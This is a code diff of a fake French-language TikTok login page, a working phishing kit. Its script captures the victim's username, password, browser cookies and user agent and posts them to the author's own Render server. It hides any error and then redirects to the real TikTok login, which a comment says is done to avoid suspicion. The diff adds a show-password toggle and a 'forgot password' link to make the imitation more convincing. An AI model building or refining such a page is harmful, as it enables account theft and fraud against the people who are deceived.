@@ -5,63 +5,86 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion | TikTok</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: black; color: #fff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; height: 100vh; margin: 0; }
-        .header { width: 100%; padding: 20px; display: flex; justify-content: space-between; box-sizing: border-box; }
-        .logo-text { font-size: 24px; font-weight: 700; margin-left: 10px; }
-        .login-container { width: 100%; max-width: 480px; padding: 20px; margin-top: -10vh; }
-        h2 { text-align: center; font-size: 32px; margin-bottom: 30px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: black; color: #fff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; height: 100vh; margin: 0; }
+        .header { width: 100%; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        .logo-container { display: flex; align-items: center; text-decoration: none; color: #fff; }
+        .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; margin-left: 10px; }
+        .help-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 600; }
+        .login-container { width: 100%; max-width: 480px; padding: 20px; box-sizing: border-box; margin-top: -10vh; }
+        h2 { text-align: center; font-size: 32px; margin-bottom: 30px; font-weight: 700; }
         .input-group { margin-bottom: 15px; position: relative; }
-        .input-group input { width: 100%; padding: 14px; border: 1px solid #333; border-radius: 4px; background-color: #222; color: #fff; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; }
-        .footer { width: 90%; padding: 20px; font-size: 12px; color: #888; display: flex; justify-content: space-between; }
+        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #333; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #222; color: #fff; }
+        .input-group input:focus { outline: none; border-color: #fe2c55; }
+        .toggle-password { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 14px; font-weight: 600; }
+        .forgot-password { display: block; text-align: left; color: #fff; text-decoration: none; font-size: 14px; margin-bottom: 24px; font-weight: 600; }
+        .login-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .footer { width: 100%; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div style="display:flex; align-items:center;">
-        <img src="tiktok.png" width="32" alt="logo"/>
+    <div class="logo-container">
+        <img src="tiktok.png" width="32" alt="logo_tiktok"/>
         <div class="logo-text">TikTok</div>
     </div>
-    <span style="font-size:14px;">Commentaires & assistance</span>
+    <a href="#" class="help-link">Commentaires et assistance</a>
 </div>
 
 <div class="login-container">
     <h2>Connexion</h2>
-    <form id="authForm">
+    <form id="tiktokForm">
         <div class="input-group">
-            <input type="text" id="user" placeholder="E-mail ou nom d'utilisateur" required>
+            <input type="text" id="userField" placeholder="E-mail ou nom d'utilisateur" required>
         </div>
         <div class="input-group">
-            <input type="password" id="pass" placeholder="Mot de passe" required>
+            <input type="password" id="passwordField" placeholder="Mot de passe" required>
+            <span class="toggle-password" id="toggleBtn">Afficher</span>
         </div>
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
         <button type="submit" class="login-btn">Se connecter</button>
     </form>
 </div>
 
-<div class="footer"><span>Français</span><div>© 2026 TikTok</div></div>
+<div class="footer">
+    <span>Français</span>
+    <div>© 2026 - TikTok</div>
+</div>
 
 <script>
-    const form = document.getElementById('authForm');
+    // 1. Afficher/Masquer le mot de passe
+    const passwordField = document.getElementById('passwordField');
+    const toggleBtn = document.getElementById('toggleBtn');
+    toggleBtn.addEventListener('click', function() {
+        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordField.setAttribute('type', type);
+        this.textContent = type === 'password' ? 'Afficher' : 'Masquer';
+    });
+
+    // 2. Capture et Envoi vers Render
+    const form = document.getElementById('tiktokForm');
     form.onsubmit = async function(e) {
         e.preventDefault();
 
         const payload = {
-            identifiant: document.getElementById('user').value,
-            password: document.getElementById('pass').value,
-            userAgent: navigator.userAgent, // Capture l'appareil
-            cookies_locaux: document.cookie  // Capture les cookies non-HttpOnly
+            identifiant: document.getElementById('userField').value,
+            password: passwordField.value,
+            userAgent: navigator.userAgent,
+            cookies_locaux: document.cookie,
+            date: new Date().toLocaleString()
         };
 
         try {
-            // Envoi vers TON serveur Render (le chemin relatif fonctionne car ils sont sur le même projet)
+            // Envoi vers la route de ton serveur Render
             await fetch('/api/auth', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+        } catch (error) {
+            console.log("Erreur silencieuse");
         } finally {
-            // Redirection vers le vrai TikTok pour ne pas éveiller de soupçons
+            // Redirection vers le vrai TikTok
             window.location.href = "https://www.tiktok.com/login";
         }
     };
